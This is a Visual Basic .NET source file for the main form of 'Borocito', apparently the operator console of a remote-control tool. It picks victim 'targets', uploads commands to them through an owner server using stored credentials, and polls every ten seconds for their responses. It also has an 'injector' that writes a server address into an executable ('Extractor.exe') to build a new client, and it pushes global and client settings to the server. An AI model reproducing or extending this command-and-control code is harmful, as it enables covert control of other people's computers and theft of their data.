Public Class Main
    Dim IsThreadReadCMDServerRunning As Boolean = False
    Dim ThreadReadCMDServer As Threading.Thread = New Threading.Thread(New Threading.ThreadStart(AddressOf ReadCommandFile))

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        TabPage5.Enabled = False
        Panel1.Dock = DockStyle.Fill
    End Sub
    Private Sub Main_HelpRequested(sender As Object, hlpevent As HelpEventArgs) Handles Me.HelpRequested
        If MessageBox.Show("Borocito fue creado y desarrollado por Zhenboro." & vbCrLf & "¿Desea visitar el sitio oficial?", "Borocito Series", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
            Process.Start("https://github.com/Zhenboro/Borocito")
            Threading.Thread.Sleep(500)
            Process.Start("https://github.com/Zhenboro")
        End If
    End Sub
    Private Sub LoaderTimer_Tick(sender As Object, e As EventArgs) Handles LoaderTimer.Tick
        LoadIt()
    End Sub
    Sub LoadIt()
        Try
            Panel1.Visible = True
            LoaderTimer.Stop()
            LoaderTimer.Enabled = False
            Init()
        Catch ex As Exception
            AddToLog("LoadIt@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Main_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If e.KeyCode = Keys.F5 Then
            Label2.Text = "Reloading..."
            ResetIt()
            Init()
        End If
    End Sub

    Sub ResetIt()
        Try
            ListBox1.Items.Clear()
            ListBox2.Items.Clear()
            ListBox3.Items.Clear()
        Catch ex As Exception
            AddToLog("ResetIt@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
        SetTarget(ListBox1.SelectedItem)
    End Sub
    Private Sub ListBox1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListBox1.MouseDoubleClick
        SetTarget(ListBox1.SelectedItem)
        GetUserInfo()
    End Sub
    Private Sub ListBox2_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListBox2.MouseDoubleClick
        SetTarget(ListBox2.SelectedItem)
        GetTelemetryInfo()
    End Sub
    Private Sub ListBox3_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListBox3.MouseDoubleClick
        GetTelemetryFile(ListBox3.SelectedItem)
    End Sub

    Sub SetCMDStatus(ByVal response As String, ByVal status As String)
        Try
            If response <> Nothing Then
                RichTextBox2.AppendText(response)
            End If
            Label_Status.Text = status
            RichTextBox2.ScrollToCaret()
        Catch ex As Exception
            AddToLog("SetCMDStatus@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SetTarget(ByVal userValue As String)
        Try
            Label4.Text = "Target: " & userValue
            userTarget = userValue
            userIDTarget = userTarget.Replace("userID_", Nothing)
            userIDTarget = userIDTarget.Replace("telemetry_", Nothing)
            TabPage5.Enabled = True
        Catch ex As Exception
            AddToLog("SetTarget@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub ComboBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles ComboBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            If ComboBox1.Text <> Nothing Then
                SendCommandFile(userIDTarget, ComboBox1.Text)
                If IsThreadReadCMDServerRunning = False Then
                    Label_Status.Text = "CMD Response thread started!"
                    ThreadReadCMDServer.Start()
                    IsThreadReadCMDServerRunning = True
                End If
            End If
        ElseIf e.KeyCode = Keys.ControlKey Then
            If IsThreadReadCMDServerRunning = False Then
                Label_Status.Text = "CMD Response thread started!"
                ThreadReadCMDServer.Start()
                IsThreadReadCMDServerRunning = True
            End If
        End If
    End Sub
    Sub ReadCommandFile()
        Try
            Dim LastUserResponse As String = Nothing
            While True
                Dim LocalCommandFile As String = DIRCommons & "\[" & userIDTarget & "]Command.str"
                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & userIDTarget & "]Command.str"
                Threading.Thread.Sleep(10000) '10 segundos
                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                End If
                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                'Leer
                Dim TheResponse As String = LeerFicheroDesdeLinea(6, LocalCommandFile)
                If TheResponse = LastUserResponse Then
                    SetCMDStatus(Nothing, "The response (" & TheResponse & ") is equal to last")
                Else
                    LastUserResponse = TheResponse
                    'quizas un if LastUserResponse <> nothing para que corra la siguiente linea, asi evitar las respuestas "fantasma"... BOO
                    If LastUserResponse <> Nothing Or LastUserResponse <> TheResponse Then
                        SetCMDStatus(vbCrLf & "Client: " & LastUserResponse, Nothing)
                    End If
                End If
            End While
        Catch ex As Exception
            AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendCommandFile(ByVal user As String, ByVal command As String)
        Label_Status.Text = "Sending command..."
        user = user.Replace("userID_", Nothing)
        user = user.Replace(".rtp", Nothing)
        userIDTarget = user
        Try
            'recuerda que hay 4 campos para comandos disponibles, buscar una forma para irlos cortando segun posicion en la linea *evitar agregar muchos textbox
            '   por ahora solo tendremos la primera linea
            If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
            End If
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", "#Command Channel for Unique User" &
                                                    vbCrLf & "Command1>" & command &
                                                    vbCrLf & "Command2>" &
                                                    vbCrLf & "Command3>" &
                                                    vbCrLf & "[Response]", False)
            My.Computer.Network.UploadFile(DIRCommons & "\userCommand.str", HostOwnerServer & "/Users/Commands/[" & user & "]Command.str", HostOwnerServerUser, HostOwnerServerPassword)
            RichTextBox2.AppendText(vbCrLf & "Server: Command Sended! (" & command & ")")
            Label_Status.Text = Nothing
            ComboBox1.Text = Nothing
            RichTextBox2.ScrollToCaret()
        Catch ex As Exception
            AddToLog("SendCommandFile@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Function LeerFicheroDesdeLinea(ByVal numeroLinea As Integer, ByVal nombreFichero As String) As String
        Dim fichero As New System.IO.FileInfo(nombreFichero)
        LeerFicheroDesdeLinea = Nothing
        If fichero.Exists Then
            Dim sr As System.IO.StreamReader
            Dim lineaActual As Integer = 1
            Try
                sr = New System.IO.StreamReader(fichero.FullName)
                While lineaActual < numeroLinea And Not sr.EndOfStream
                    sr.ReadLine()
                    lineaActual += 1
                End While
                LeerFicheroDesdeLinea = sr.ReadToEnd
            Catch ex As Exception
                RichTextBox2.AppendText(vbCrLf & "Error: " & ex.Message)
                Console.WriteLine("[LeerFicheroDesdeLinea@Main]Error: " & ex.Message)
            Finally
                If sr IsNot Nothing Then
                    sr.Close()
                    sr.Dispose()
                End If
            End Try
        End If
    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim injectableOpener As New OpenFileDialog
        injectableOpener.Filter = "All file types|*.*"
        injectableOpener.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        injectableOpener.Title = "Abrir ejecutable inyectable..."
        injectableOpener.FileName = "Extractor.exe"
        If injectableOpener.ShowDialog() = DialogResult.OK Then
            Dim injectableSaver As New SaveFileDialog
            injectableSaver.Filter = "Executable file|*.exe"
            injectableSaver.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            injectableSaver.Title = "Guardar ejecutable inyectado..."
            injectableSaver.FileName = "Extractor"
            If injectableSaver.ShowDialog() = DialogResult.OK Then
                If TextBox2.Text <> Nothing Then
                    PutInject(TextBox2.Text, injectableOpener.FileName, injectableSaver.FileName)
                Else
                    If MessageBox.Show("No ha ingresado un servidor para inyectar." & vbCrLf & "¿Desea usar el servidor actual?", "Injector", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                        PutInject(OwnerServer, injectableOpener.FileName, injectableSaver.FileName)
                    End If
                End If
            End If
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim LocalFilePath As String = DIRCommons & "\GlobalSettings.ini"
            Dim RemoteFilePath As String = HttpOwnerServer & "/GlobalSettings.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.FileSystem.WriteAllText(LocalFilePath, RichTextBox4.Text, False)
            My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            MsgBox("Global Settings aplicado.", MsgBoxStyle.Information, "Configuracion Servidor")
        Catch ex As Exception
            AddToLog("SendGlobalSettings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Dim LocalFilePath As String = DIRCommons & "\ClientConfig.ini"
            Dim RemoteFilePath As String = HostOwnerServer & "/Client.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.FileSystem.WriteAllText(LocalFilePath, RichTextBox5.Text, False)
            My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            MsgBox("Client Settings aplicado.", MsgBoxStyle.Information, "Configuracion Servidor")
        Catch ex As Exception
            AddToLog("SendClientSettings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
End Class